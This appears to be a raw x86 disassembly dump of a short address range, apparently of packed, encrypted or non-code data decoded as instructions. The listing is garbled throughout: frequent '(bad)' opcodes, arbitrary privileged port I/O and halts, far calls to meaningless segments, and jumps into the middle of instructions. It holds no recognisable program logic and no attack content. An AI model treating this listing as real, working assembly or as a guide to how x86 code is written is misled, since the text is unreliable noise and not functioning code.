  424ffc:	mov    bl,0xaf
  424ffe:	sbb    edx,DWORD PTR [ecx-0x3c01eba3]
  425004:	fst    st(1)
  425006:	test   eax,0xaa24885
  42500b:	jno    0x424fb3
  42500d:	mov    eax,0xe917a46c
  425012:	push   0xffffffe3
  425014:	daa    
  425015:	adc    al,0x48
  425017:	inc    esp
  425018:	jle    0x425032
  42501a:	push   esi
  42501b:	adc    eax,0x65db27ac
  425020:	je     0x424fe1
  425022:	sub    BYTE PTR [edi+0x2bc090c6],dl
  425028:	add    eax,DWORD PTR [esi+ecx*4]
  42502b:	pop    es
  42502c:	(bad)  
  42502d:	cli    
  42502e:	mov    ebp,esp
  425030:	shl    BYTE PTR [ecx-0x25fc6869],cl
  425036:	cmp    DWORD PTR [ebx+0x3e],0xffffffb4
  42503a:	xor    al,0xbb
  42503c:	in     eax,0xb0
  42503e:	in     eax,0xab
  425040:	and    BYTE PTR [edx-0x43f10556],bh
  425046:	in     eax,0x39
  425048:	sbb    DWORD PTR [edi+0x1e],ecx
  42504b:	mov    dh,0x8f
  42504d:	sbb    al,0xc
  42504f:	sbb    BYTE PTR [ecx],ch
  425051:	mov    ch,0x55
  425053:	bound  esi,QWORD PTR [edi]
  425055:	js     0x42508c
  425057:	or     DWORD PTR [ebx+0x49f0d697],edx
  42505d:	daa    
  42505e:	daa    
  42505f:	aam    0x7b
  425061:	xlat   BYTE PTR ds:[ebx]
  425062:	test   BYTE PTR [eax-0x44],ch
  425065:	and    esi,DWORD PTR [eax+0x62e210ce]
  42506b:	inc    ebx
  42506c:	fsubr  st,st(7)
  42506e:	fimul  DWORD PTR [ebp-0x10e7d36a]
  425074:	arpl   WORD PTR [eax+0x6f],dx
  425077:	imul   esi,DWORD PTR [ebx],0x7b0a6340
  42507d:	call   0x3a84:0x9e6cfd12
  425084:	mov    ch,0x94
  425086:	mov    ecx,0xeb698e73
  42508b:	ror    DWORD PTR [edi+0x6697eb88],1
  425091:	in     al,dx
  425092:	xor    eax,ebp
  425094:	jnp    0x42508a
  425096:	(bad)  
  425097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425098:	out    0x50,al
  42509a:	or     ebx,esp
  42509c:	push   0xad51b04
  4250a1:	rep lods eax,DWORD PTR ds:[esi]
  4250a3:	mov    eax,0xc762f587
  4250a8:	xchg   DWORD PTR [ecx+0x44],esi
  4250ab:	mov    edx,0x40f467d0
  4250b0:	inc    ecx
  4250b1:	daa    
  4250b2:	inc    esi
  4250b3:	std    
  4250b4:	fld    DWORD PTR [esi]
  4250b6:	mov    ebx,fs
  4250b8:	mov    ch,0x76
  4250ba:	mov    ebx,0xcb2b7496
  4250bf:	mov    bh,0x62
  4250c1:	hlt    
  4250c2:	push   esi
  4250c3:	xchg   ebp,eax
  4250c4:	mov    ecx,0x20351aef
  4250c9:	mov    BYTE PTR [edx-0x2ba44f96],al
  4250cf:	mul    DWORD PTR [edx]
  4250d1:	pop    ecx
  4250d2:	push   edi
  4250d3:	inc    ebx
  4250d4:	repnz inc eax
  4250d6:	fcom   DWORD PTR [edi+edx*2-0x3a]
  4250da:	push   esi
  4250db:	pop    ebp
  4250dc:	mov    BYTE PTR [ecx-0x13d5e817],dh
  4250e2:	push   edi
  4250e3:	and    ah,bl
  4250e5:	xor    ebx,eax
  4250e7:	int3   
  4250e8:	ins    BYTE PTR es:[edi],dx
  4250e9:	lea    ecx,[edx]
  4250eb:	cmp    eax,0x28da7dc9
  4250f0:	test   eax,0x7a5bcbf9
  4250f5:	mov    dl,0x4b
  4250f7:	into   
  4250f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250f9:	xchg   ebx,eax
  4250fa:	push   esi
  4250fb:	and    BYTE PTR [eax],dl
  4250fd:	push   0xffffffd3
  4250ff:	xor    dh,BYTE PTR [eax-0x4017d48d]
  425105:	xor    cl,BYTE PTR [ebx+0xb]
  425108:	ins    DWORD PTR es:[edi],dx
  425109:	inc    esi
  42510a:	ins    DWORD PTR es:[edi],dx
  42510b:	mov    eax,0xe6f962f9
  425110:	xor    BYTE PTR [ecx+0x71],0xc1
  425114:	test   BYTE PTR [ecx-0x3a],cl
  425117:	xor    al,BYTE PTR [edx-0x348abb35]
  42511d:	cmp    DWORD PTR [ebx+0x4129c384],edi
  425123:	jb     0x425119
  425125:	jmp    0x8ad4:0x879cd1a0
  42512c:	dec    edx
  42512d:	push   eax
  42512e:	xor    eax,DWORD PTR [edi+0x64e2e54a]
  425134:	pop    ebx
  425135:	fnstcw WORD PTR [edx+0x616792d7]
  42513b:	fld    QWORD PTR [ecx+eiz*2-0x3ea962af]
  425142:	push   es
  425143:	sbb    al,0xbb
  425145:	push   esp
  425146:	sub    eax,0x1ee0a68f
  42514b:	adc    eax,0x8499b8c7
  425150:	mov    DWORD PTR [edx],eax
  425152:	call   0x6b89:0x97baaec2
  425159:	mul    BYTE PTR ds:0x1a3111a4
  42515f:	call   0xce6:0xdcb91c9c
  425166:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425167:	scas   al,BYTE PTR es:[edi]
  425168:	or     ah,dh
  42516a:	inc    ebx
  42516b:	call   0xfedef944
  425170:	adc    al,0x20
  425172:	jne    0x42513f
  425174:	(bad)  
  425175:	mov    al,ds:0x624bce6d
  42517a:	clc    
  42517b:	(bad)  
  42517c:	ins    BYTE PTR es:[edi],dx
  42517d:	mov    ch,bl
  42517f:	mov    al,ds:0x8db5a28d
  425184:	jne    0x42515b
  425186:	push   ss
  425187:	scas   eax,DWORD PTR es:[edi]
  425188:	ja     0x42517e
  42518a:	add    al,BYTE PTR [edi+edi*2+0x21]
  42518e:	in     al,dx
  42518f:	sbb    DWORD PTR [edx],eax
  425191:	sahf   
  425192:	imul   ebp,edi,0xc8988111
  425198:	stc    
  425199:	mov    esi,0xa0a4d1ab
  42519e:	xchg   ebp,eax
  42519f:	adc    BYTE PTR [ebp+0x631f2df5],0xaf
  4251a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4251a7:	ins    DWORD PTR es:[edi],dx
  4251a8:	popf   
  4251a9:	add    cl,BYTE PTR [edi]
  4251ab:	inc    edi
  4251ac:	test   eax,esp
  4251ae:	fidiv  DWORD PTR [edi+ebp*4]
  4251b1:	fdivr  DWORD PTR [ebp-0x20]
  4251b4:	jl     0x425228
  4251b6:	push   edx
  4251b7:	mov    al,0x2a
  4251b9:	push   edi
  4251ba:	ins    DWORD PTR es:[edi],dx
  4251bb:	push   ebx
  4251bc:	stos   BYTE PTR es:[edi],al
  4251bd:	loope  0x42521b
  4251bf:	push   eax
  4251c0:	xchg   BYTE PTR ds:0x6df3b30c,dl
  4251c6:	retf   
  4251c7:	mov    cl,0xda
  4251c9:	out    0xe3,eax
  4251cb:	shr    BYTE PTR [esi],1
  4251cd:	rcr    BYTE PTR [ebx-0x6c8c84f0],1
  4251d3:	mov    al,bh
  4251d5:	inc    esp
  4251d6:	(bad)  
  4251d7:	loop   0x4251c8
  4251d9:	mov    eax,0xc2c43ed8
  4251de:	mov    cl,0x7
  4251e0:	dec    eax
  4251e1:	cmp    DWORD PTR ds:0xd7987232,ebp
  4251e7:	inc    edi
  4251e8:	(bad)  
  4251e9:	ja     0x4251aa
  4251eb:	pop    ds
  4251ec:	inc    edi
  4251ed:	call   DWORD PTR [edx]
  4251ef:	hlt    
  4251f0:	sub    BYTE PTR [ebx-0x2f2e03a1],bl
  4251f6:	mov    DWORD PTR [ebx],ecx
  4251f8:	mov    dh,0x8c
  4251fa:	and    BYTE PTR [ebp-0xe1ddbad],0x36
  425201:	mov    ecx,0x8f195b79
  425206:	jae    0x42523a
  425208:	and    eax,0xfa816820
  42520d:	pop    eax
  42520e:	in     eax,dx
  42520f:	hlt    
  425210:	push   esi
  425211:	repnz cld 
  425213:	inc    ebp
  425214:	into   
  425215:	(bad)  
  425216:	jecxz  0x4251e7
  425218:	xor    edx,DWORD PTR [edx+0x79]
  42521b:	or     bh,BYTE PTR [esi-0x1]
  42521e:	pop    edi
  42521f:	out    dx,al
  425220:	mov    al,ds:0xac9e9881
  425225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425226:	int3   
  425227:	cmp    edx,0x8a8ca922
  42522d:	jmp    0x3c3e59d0
  425232:	test   DWORD PTR ds:0xa520b40b,eax
  425238:	add    eax,0x8df7bc28
  42523d:	int3   
  42523e:	enter  0xbc79,0x45
  425242:	imul   esi,DWORD PTR [eax+0xc578ed3],0x962430b0
  42524c:	mov    dh,0xd9
  42524e:	lahf   
  42524f:	icebp  
  425250:	adc    ah,BYTE PTR [ecx-0x66]
  425253:	popa   
  425254:	out    dx,eax
  425255:	(bad)  
  425257:	jmp    0x42520c
  425259:	into   
  42525a:	adc    eax,0x4a27869
  42525f:	imul   edx,DWORD PTR [ecx+0x66],0x6e11ba7d
  425266:	adc    BYTE PTR [eax+0x2484bef2],dl
  42526c:	sub    DWORD PTR [edi-0x2f31f8fd],0x547aadfc
  425276:	pop    ebx
  425277:	mov    ecx,DWORD PTR [eax+0x2cf99c27]
  42527d:	addr16 mov ecx,edx
  425280:	popf   
  425281:	sbb    BYTE PTR [edi],0x4c
  425284:	sbb    al,0xa9
  425286:	jecxz  0x425306
  425288:	(bad)  
  425289:	mov    bl,0x5b
  42528b:	add    BYTE PTR [edx+0x71],dh
  42528e:	add    ebp,DWORD PTR [eax]
  425290:	js     0x42529b
  425292:	adc    al,dh
  425294:	mov    esi,0x54e5f36c
  425299:	shl    BYTE PTR [ebp+0x108bf144],cl
  42529f:	inc    eax
  4252a0:	sahf   
  4252a1:	push   ebx
  4252a2:	dec    edx
  4252a3:	add    cl,0xa9
  4252a6:	aad    0xa8
  4252a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4252a9:	pop    ss
  4252aa:	aad    0x4d
  4252ac:	clc    
  4252ad:	test   al,0xd1
  4252af:	pop    ecx
  4252b0:	mov    ecx,0x8d052169
  4252b5:	jg     0x42525f
  4252b7:	nop
  4252b8:	cdq    
  4252b9:	rcl    BYTE PTR [ebx],0x6a
  4252bc:	fst    DWORD PTR [ebx]
  4252be:	xor    DWORD PTR [edx-0x6b7b61f],ebx
  4252c4:	test   al,0xdf
  4252c6:	out    dx,al
  4252c7:	sbb    BYTE PTR [ebx+0x20],dl
  4252ca:	dec    edi
  4252cb:	in     al,dx
  4252cc:	xchg   ecx,eax
  4252cd:	lock arpl WORD PTR [edx+eax*8],si
  4252d1:	pop    eax
  4252d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4252d3:	ret    
  4252d4:	jns    0x42525e
  4252d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4252d7:	inc    eax
  4252d8:	ins    DWORD PTR es:[edi],dx
  4252d9:	xor    ah,BYTE PTR [eax+0x11db406f]
  4252df:	out    0xdf,eax
  4252e1:	xchg   DWORD PTR [ebp-0x15],esp
  4252e4:	cs push ds
  4252e6:	enter  0x61c7,0xba
  4252ea:	das    
  4252eb:	cld    
  4252ec:	add    edi,edi
  4252ee:	dec    edx
  4252ef:	add    eax,0x82bf740e
  4252f4:	dec    ecx
  4252f5:	xchg   esi,eax
  4252f6:	xor    ebx,ebx
  4252f8:	(bad)  
  4252f9:	jmp    0x314aa74b
  4252fe:	iret   
  4252ff:	xor    ebx,ebp
  425301:	rol    esi,0x2b
  425304:	dec    ebp
  425305:	mov    ebx,0xc186480
  42530a:	cmp    eax,0x8b978f1a
  42530f:	sub    esp,DWORD PTR [ebx]
  425311:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425313:	lods   eax,DWORD PTR ds:[esi]
  425314:	js     0x4252bf
  425316:	cmp    ecx,ecx
  425318:	sub    eax,0xf783bb36
  42531d:	in     eax,0x6a
  42531f:	repz add eax,0xd896cf23
  425325:	cli    
  425326:	test   al,0x79
  425328:	lods   eax,DWORD PTR ds:[esi]
  425329:	mov    edi,0xa2375b3f
  42532e:	out    0x46,eax
  425330:	aaa    
  425331:	fcomp  QWORD PTR ds:0x98a7fdd
  425337:	rol    BYTE PTR [ecx-0x662155b6],1
  42533d:	jmp    0x911c00c0
  425342:	mov    ds:0x57677f67,al
  425347:	mov    edi,0x37d8b84a
  42534c:	inc    ebx
  42534d:	sbb    al,0x87
  42534f:	pusha  
  425350:	(bad)  
  425351:	std    
  425352:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425353:	out    dx,eax
  425354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425355:	jnp    0x42536d
  425357:	mov    al,ds:0xed0a6df
  42535c:	inc    ebx
  42535d:	mov    ds:0xd362eb58,al
  425362:	stos   BYTE PTR es:[edi],al
  425363:	je     0x4252e9
  425365:	mov    dl,0x73
  425367:	xor    bl,al
  425369:	call   0x31c9:0xabe325b6
  425370:	stc    
  425371:	out    0x49,eax
  425373:	nop
  425374:	retf   
  425375:	push   cx
  425377:	repz xchg dl,cl
  42537a:	sub    BYTE PTR [esp+ebx*2+0x62],ah
  42537e:	popa   
  42537f:	scas   eax,DWORD PTR es:[edi]
  425380:	enter  0x867f,0xea
  425384:	ret    
  425385:	outs   dx,BYTE PTR ds:[esi]
  425386:	or     ch,bh
  425388:	xchg   ebx,eax
  425389:	iret   
  42538a:	jnp    0x425402
  42538c:	ret    0x5a30
  42538f:	repz addr16 jg 0x4253c1
  425393:	mov    dh,0x78
  425395:	jp     0x4253c4
  425397:	sub    ah,BYTE PTR [edx-0xc]
  42539a:	jbe    0x42535b
  42539c:	loop   0x425417
  42539e:	repnz cwde 
  4253a0:	xchg   ebx,eax
  4253a1:	xchg   edx,eax
  4253a2:	test   eax,0x9412d68f
  4253a7:	dec    esp
  4253a8:	cmp    DWORD PTR [edx],ebp
  4253aa:	jp     0x4253e9
  4253ac:	jbe    0x4253e1
  4253ae:	les    edi,FWORD PTR [eax]
  4253b0:	sbb    eax,0xb0c220d6
  4253b5:	dec    edx
  4253b6:	vandnps xmm0,xmm7,xmm4
  4253ba:	aas    
  4253bb:	pop    ds
  4253bc:	(bad)  
  4253bd:	cwde   
  4253be:	push   ss
  4253bf:	inc    esp
  4253c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253c1:	sbb    edi,edx
  4253c3:	cwde   
  4253c4:	cmp    ecx,DWORD PTR [ecx]
  4253c6:	dec    esi
  4253c7:	sub    al,0x7e
  4253c9:	xchg   esp,eax
  4253ca:	cmc    
  4253cb:	add    DWORD PTR [edx],eax
  4253cd:	call   0x30d3:0x1345fc9c
  4253d4:	dec    ebx
  4253d5:	dec    edi
  4253d6:	pop    eax
  4253d7:	iret   
  4253d8:	pop    es
  4253d9:	push   esp
  4253da:	cld    
  4253db:	fld    TBYTE PTR [edx+0x18e4aec]
  4253e1:	adc    dh,BYTE PTR [esi-0x22a5d006]
  4253e7:	test   al,0xc3
  4253e9:	in     eax,0x1b
  4253eb:	lods   eax,DWORD PTR ds:[esi]
  4253ec:	call   FWORD PTR [eax-0x14f70508]
  4253f2:	fwait
  4253f3:	les    esi,FWORD PTR [ebx+0x27008f08]
  4253f9:	sub    ah,BYTE PTR [eax-0x33]
  4253fc:	iret   
  4253fd:	(bad)  
  4253fe:	lods   eax,DWORD PTR ds:[esi]
  4253ff:	xchg   esp,eax
  425400:	stos   BYTE PTR es:[edi],al
  425401:	shld   DWORD PTR [ebp+0x10],esi,0x5f
  425406:	jo     0x4253ef
  425408:	sub    eax,0xef420eb5
  42540d:	jle    0x425463
  42540f:	mov    ds:0xbe9fcbf2,eax
  425414:	pop    eax
  425415:	mov    cl,0x95
  425417:	pop    ds
  425418:	test   eax,0xe3b4430e
  42541d:	sub    edx,DWORD PTR [ebp+0x74]
  425420:	xor    BYTE PTR [esi],dh
  425422:	nop
  425423:	and    BYTE PTR [ebx],bh
  425425:	jbe    0x42540b
  425427:	test   DWORD PTR [ebp-0x4f3ff2a8],ebx
  42542d:	pop    esi
  42542e:	shl    BYTE PTR [edi],0x28
  425431:	jae    0x42542f
  425433:	clc    
  425434:	jecxz  0x42544a
  425436:	jo     0x425482
  425438:	inc    ecx
  425439:	aad    0x1c
  42543b:	shl    DWORD PTR [ebx+0x51],0x9
  42543f:	sub    al,0x21
  425441:	mov    WORD PTR [esi],ds
  425443:	aad    0x80
  425445:	mov    ds:0x88e82abe,eax
  42544a:	mov    cl,0xbf
  42544c:	xchg   BYTE PTR [ecx],bh
  42544e:	mov    dl,0xf6
  425450:	and    bh,BYTE PTR [ecx-0x34]
  425453:	or     ah,ch
  425455:	lods   eax,DWORD PTR ds:[esi]
  425456:	jl     0x42540f
  425458:	adc    al,0x2b
  42545a:	dec    ecx
  42545b:	sub    al,0xa7
  42545e:	sbb    BYTE PTR [ebx],bh
  425460:	jo     0x42547d
  425462:	cs pushf 
  425464:	mov    ?,ebx
  425466:	mov    dh,0x9f
  425468:	out    0xc6,eax
  42546a:	dec    edx
  42546b:	add    al,0x28
  42546d:	ret    0xf190
  425470:	retf   
  425471:	xor    al,0xb4
  425473:	cs sahf 
  425475:	pop    edx
  425476:	mov    cl,0x20
  425478:	jno    0x4254c1
  42547a:	inc    edx
  42547b:	int    0x74
  42547d:	cmp    DWORD PTR [edi],0x4f29b36a
  425483:	push   edx
  425484:	retf   
  425485:	call   0xa830:0x48a8fc4b
  42548c:	aas    
  42548d:	cmp    DWORD PTR [edx+eax*2+0x6e],ecx
  425491:	sub    al,0x31
  425493:	hlt    
  425494:	emms   
  425496:	adc    al,0x0
	...
  425514:	xor    eax,esp
  425516:	loope  0x4254d1
  425518:	icebp  
  425519:	mov    ecx,0xab3fe879
  42551e:	in     al,0x3
  425520:	ret    0xec0b
  425523:	dec    esp
  425524:	in     eax,0xe7
  425526:	add    DWORD PTR [eax],eax
  425528:	imul   eax,DWORD PTR [edi],0x0
  42552b:	add    BYTE PTR [eax],dl
  42552d:	hlt    
  42552e:	loope  0x4254f7
  425530:	adc    eax,DWORD PTR [eax-0x557bd86]
  425536:	ds (bad) 
  425538:	sti    
  425539:	mov    al,ds:0x95533637
  42553e:	sahf   
  42553f:	inc    ecx
  425540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425541:	ss stos DWORD PTR es:[edi],eax
  425543:	call   0xf081:0x596bdb50
  42554a:	mov    dl,0x21
  42554c:	test   al,0x87
  42554e:	mov    es,WORD PTR [eax+0x61]
  425551:	in     al,dx
  425552:	push   eax
  425553:	add    DWORD PTR [ebp+0x24702277],esp
  425559:	fs icebp 
  42555b:	sub    eax,0x119254d5
  425560:	mov    dh,0x3a
  425562:	lods   eax,DWORD PTR ds:[esi]
  425563:	sbb    DWORD PTR [ebp-0x35ee6c0e],esp
  425569:	xchg   BYTE PTR [edx-0x69270249],ch
  42556f:	bound  esp,QWORD PTR gs:0x73bffb26
  425576:	stc    
  425577:	pop    es
  425578:	jbe    0x4255b9
  42557a:	xor    bh,bl
  42557c:	lods   al,BYTE PTR ds:[esi]
  42557d:	aad    0xb8
  42557f:	ds repnz sti 
  425582:	pop    es
  425583:	or     DWORD PTR [edx],0xffffff84
  425586:	lods   eax,DWORD PTR ds:[esi]
  425587:	aad    0xc6
  425589:	adc    edi,eax
  42558b:	push   edi
  42558c:	adc    al,0x4f
  42558e:	stos   BYTE PTR es:[edi],al
  42558f:	mov    ss,esp
  425591:	pop    esp
  425592:	cmp    ebx,ecx
  425594:	fwait
  425595:	sub    eax,0x2b47a415
  42559a:	out    dx,al
  42559b:	enter  0x465f,0xbd
  42559f:	popf   
  4255a0:	mov    edx,0x6b373dbe
  4255a5:	sbb    ah,ch
  4255a7:	in     eax,dx
  4255a8:	cmp    al,0x9b
  4255aa:	js     0x425564
  4255ac:	and    al,0x5a
  4255ae:	in     al,0x5e
  4255b0:	mov    ebx,0xccee9db8
  4255b5:	mov    esp,0x8ccbbdab
  4255ba:	push   ds
  4255bb:	test   eax,0x509af77f
  4255c0:	cmp    bh,BYTE PTR [edx]
  4255c2:	std    
  4255c3:	cmp    BYTE PTR [ecx],bl
  4255c5:	arpl   WORD PTR [ecx-0x5b554db7],ax
  4255cb:	leave  
  4255cc:	shl    BYTE PTR [eax+esi*2+0x5e],1
  4255d0:	sub    BYTE PTR [edi+0x4d],0xfe
  4255d4:	addr16 and eax,0x7c9ecceb
  4255da:	or     eax,0xb0bef983
  4255df:	sahf   
  4255e0:	dec    eax
  4255e1:	cmp    esi,DWORD PTR [edx+0x2b4e0997]
  4255e7:	jns    0x425611
  4255e9:	jp     0x42559b
  4255eb:	stc    
  4255ec:	sbb    eax,0x85eba944
  4255f1:	push   eax
  4255f2:	dec    ebp
  4255f3:	jo     0x425605
  4255f5:	test   al,0x1b
  4255f7:	fs das 
  4255f9:	lods   eax,DWORD PTR ds:[esi]
  4255fa:	aam    0x93
  4255fc:	xchg   ebp,eax
  4255fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4255fe:	inc    esp
  4255ff:	out    dx,eax
  425600:	adc    bx,ax
  425603:	push   ebx
  425604:	mov    DWORD PTR [edi-0x73f34ff],0x2409f9
  42560e:	xlat   BYTE PTR ds:[ebx]
  42560f:	pop    ecx
  425610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425611:	fsubr  DWORD PTR [ebp+0x74fa6ea2]
  425617:	adc    eax,0xe0a7f75c
  42561c:	ins    DWORD PTR es:[edi],dx
  42561d:	icebp  
  42561e:	and    BYTE PTR [edx+0x4],dh
  425621:	push   ebp
  425622:	inc    eax
  425623:	scas   eax,DWORD PTR es:[edi]
  425624:	fdivr  st,st(0)
  425626:	les    ebp,FWORD PTR [ebp+0xbb415f4]
  42562c:	(bad)  
  42562e:	dec    esi
  42562f:	xchg   ebp,eax
  425630:	ins    DWORD PTR es:[edi],dx
  425631:	gs add edi,0x4337f581
  425638:	or     al,0xf5
  42563a:	add    eax,0x5f85f395
  42563f:	mov    bl,0x4
  425641:	mov    ecx,0x3e4ab86b
  425646:	imul   eax,DWORD PTR [edi+ebx*4+0x14],0x9ca8805f
  42564e:	ss push esp
  425650:	inc    ecx
  425651:	ja     0x4255ef
  425653:	es ds push esi
  425656:	ja     0x4255e5
  425658:	mov    ds:0x16491c5,eax
  42565d:	loopne 0x425695
  42565f:	rcr    DWORD PTR [edx],cl
  425661:	out    dx,eax
  425662:	out    dx,eax
  425663:	dec    esi
  425664:	sub    ebp,ecx
  425666:	mov    bl,0xfb
  425668:	mov    ebx,0x2a948324
  42566d:	adc    eax,DWORD PTR [ebx+esi*1]
  425670:	imul   ebp,DWORD PTR [eax-0x1d],0xbdf72d71
  425677:	adc    bl,BYTE PTR [edi]
  425679:	mov    ebp,0xec6a6d25
  42567e:	mov    al,ds:0xfef59e31
  425683:	pop    es
  425684:	fimul  DWORD PTR [edx-0x3c]
  425687:	fild   QWORD PTR [esi-0x55]
  42568a:	out    dx,eax
  42568b:	adc    al,0x85
  42568d:	outs   dx,BYTE PTR ds:[esi]
  42568e:	mov    al,0xc8
  425690:	push   esp
  425691:	sub    edx,esi
  425693:	cld    
  425694:	ret    
  425695:	pop    edi
  425696:	jo     0x4256f4
  425698:	sub    ebp,ebp
  42569a:	ror    BYTE PTR [edi+0x5310baf5],0xbf
  4256a1:	retf   
  4256a2:	jbe    0x4256db
  4256a4:	push   ds
  4256a5:	adc    bh,ch
  4256a7:	daa    
  4256a8:	stc    
  4256a9:	jmp    0xfb8b8ba7
  4256ae:	sub    DWORD PTR [ecx-0x7d],edi
  4256b1:	push   ss
  4256b2:	or     cl,dh
  4256b4:	loopne 0x42568d
  4256b6:	out    dx,al
  4256b7:	shl    DWORD PTR [edi],cl
  4256b9:	mov    esp,DWORD PTR [esi]
  4256bb:	xchg   ebx,eax
  4256bc:	jns    0x425681
  4256be:	dec    eax
  4256bf:	xchg   ebx,eax
  4256c0:	push   ebx
  4256c1:	shl    BYTE PTR [edx-0x35df6e4c],0xb7
  4256c8:	pop    esi
  4256c9:	in     al,0xa2
  4256cb:	rcr    BYTE PTR ds:0x9d9b7451,cl
  4256d1:	(bad)  
  4256d2:	inc    ebx
  4256d3:	jae    0x4256f2
  4256d5:	fnstcw WORD PTR [ebx+0xe]
  4256d8:	or     al,0xd4
  4256da:	mov    ds:0x8053dda1,eax
  4256df:	jne    0x4256a1
  4256e1:	or     al,0x1e
  4256e3:	out    dx,al
  4256e4:	sbb    al,0xce
  4256e6:	or     DWORD PTR [edx-0x7e],edi
  4256e9:	adc    al,0xbe
  4256eb:	ret    
  4256ec:	aaa    
  4256ed:	leave  
  4256ee:	enter  0xc457,0xc0
  4256f2:	pop    esp
  4256f3:	and    esp,DWORD PTR [ebp-0x17]
  4256f6:	iret   
  4256f7:	mov    ebp,0x8f9274a5
  4256fc:	test   al,0xbb
  4256fe:	pop    eax
  4256ff:	cmp    eax,0x40ba94c6
  425704:	and    edx,DWORD PTR [ecx]
  425706:	repnz push 0xffffffcf
  425709:	xor    DWORD PTR [edi-0x76],esp
  42570c:	iret   
  42570d:	(bad)  
  42570e:	call   0xefb4:0x9a3d601b
  425715:	out    0x7e,eax
  425717:	into   
  425718:	xchg   edx,eax
  425719:	popf   
  42571a:	push   eax
  42571b:	pop    ss
  42571c:	out    dx,eax
  42571d:	retf   0x1828
  425720:	into   
  425721:	add    eax,0xd6254b86
  425726:	imul   bh
  425728:	dec    eax
  425729:	xlat   BYTE PTR ds:[ebx]
  42572a:	outs   dx,DWORD PTR ds:[esi]
  42572b:	das    
  42572c:	xchg   DWORD PTR [ebx+0x14],eax
  42572f:	add    DWORD PTR [eax-0x67ac5640],esi
  425735:	jno    0x425782
  425737:	test   BYTE PTR [ebp+0x1c],bl
  42573a:	fmul   st,st(2)
  42573c:	fbstp  TBYTE PTR [ebx]
  42573e:	inc    ebx
  42573f:	ffreep st(0)
  425741:	and    BYTE PTR [edx+esi*4-0x5b],al
  425745:	cmp    DWORD PTR [ebp+0x36],edx
  425748:	into   
  425749:	inc    esp
  42574a:	inc    ebp
  42574b:	sub    edi,ecx
  42574d:	retf   0x7fcb
  425750:	and    eax,0xaba18e34
  425755:	mov    edx,0xba4dc6cd
  42575a:	shl    ebx,0x96
  42575d:	test   al,0x4f
  42575f:	dec    edx
  425760:	outs   dx,DWORD PTR ds:[esi]
  425761:	inc    eax
  425762:	jmp    0x42577d
  425764:	mov    ch,0xd4
  425766:	in     al,0x6b
  425768:	retf   
  425769:	xor    ebx,edx
  42576b:	leave  
  42576c:	cmp    edi,DWORD PTR [ebp+0x7a]
  42576f:	or     eax,0xf7a6f7ab
  425774:	popf   
  425775:	pop    edi
  425776:	xor    BYTE PTR [ebx+0x22],0x44
  42577a:	jecxz  0x425747
  42577c:	jbe    0x4256fe
  42577e:	leave  
  42577f:	sub    edx,DWORD PTR [edi]
  425781:	mov    dh,0x9d
  425783:	in     al,0x5a
  425785:	nop
  425786:	pop    eax
  425787:	sub    DWORD PTR ds:0xcdd38941,edx
  42578d:	jmp    0x16cb:0xa46a2075
  425794:	es aas 
  425796:	das    
  425797:	stc    
  425798:	aad    0xdf
  42579a:	adc    eax,0x95d8fd17
  42579f:	(bad)  
  4257a0:	jae    0x4257d8
  4257a2:	dec    esi
  4257a3:	sar    bl,1
  4257a5:	mov    ah,0x36
  4257a7:	lds    eax,FWORD PTR [ebx]
  4257a9:	xchg   ecx,eax
  4257aa:	aaa    
  4257ab:	jle    0x4257ab
  4257ad:	out    0xe7,eax
  4257af:	xchg   ebp,eax
  4257b0:	pop    es
  4257b1:	xchg   esi,eax
  4257b2:	adc    al,0x94
  4257b4:	jle    0x4257f8
  4257b6:	dec    eax
  4257b7:	div    DWORD PTR [ecx+edi*8+0x70f61d30]
  4257be:	rol    DWORD PTR [eax-0x48e7d7c],cl
  4257c4:	dec    edx
  4257c5:	scas   eax,DWORD PTR es:[edi]
  4257c6:	pop    edx
  4257c7:	cdq    
  4257c8:	enter  0xc8e0,0xa1
  4257cc:	test   DWORD PTR [edi],esp
  4257ce:	imul   ebp,DWORD PTR [edi+0x4db72928],0x12
  4257d5:	adc    BYTE PTR [ecx-0x5cc5a5ba],al
  4257db:	fcmovnu st,st(4)
  4257dd:	pusha  
  4257de:	jno    0x42583e
  4257e0:	adc    BYTE PTR [ebp-0x33],ch
  4257e3:	xor    bh,BYTE PTR [edi-0x70]
  4257e6:	and    DWORD PTR [edx],edi
  4257e8:	jo     0x425813
  4257ea:	fdivrp st(3),st
  4257ec:	adc    eax,0x810131b
  4257f1:	ins    BYTE PTR es:[edi],dx
  4257f2:	jp     0x4257be
  4257f4:	imul   esp,ecx,0x30
  4257f7:	cwde   
  4257f8:	scas   al,BYTE PTR es:[edi]
  4257f9:	inc    esp
  4257fa:	out    0x3c,al
  4257fc:	inc    ebx
  4257fd:	push   cs
  4257fe:	test   BYTE PTR [ebp+0xb004e26],al
  425804:	leave  
  425805:	cmp    al,0xe7
  425807:	cs cmc 
  425809:	cmp    DWORD PTR [eax+ebx*8+0x69],ecx
  42580d:	retf   
  42580e:	call   0x16c97435
  425813:	push   ebx
  425814:	push   cs
  425815:	xchg   esp,eax
  425816:	icebp  
  425817:	pop    edi
  425818:	xlat   BYTE PTR ds:[ebx]
  425819:	loope  0x425825
  42581b:	cld    
  42581c:	lods   al,BYTE PTR ds:[esi]
  42581d:	int3   
  42581e:	dec    esi
  42581f:	cdq    
  425820:	xor    esp,ebx
  425822:	aas    
  425823:	dec    esi
  425824:	dec    ebx
  425825:	loop   0x42580f
  425827:	clc    
  425828:	out    0x48,al
  42582a:	inc    ebx
  42582b:	sbb    edi,esp
  42582d:	mov    esp,0x3f8c74ba
  425832:	adc    ecx,ecx
  425834:	(bad)  [ebx-0x65]
  425837:	add    al,0x53
  425839:	stos   BYTE PTR es:[edi],al
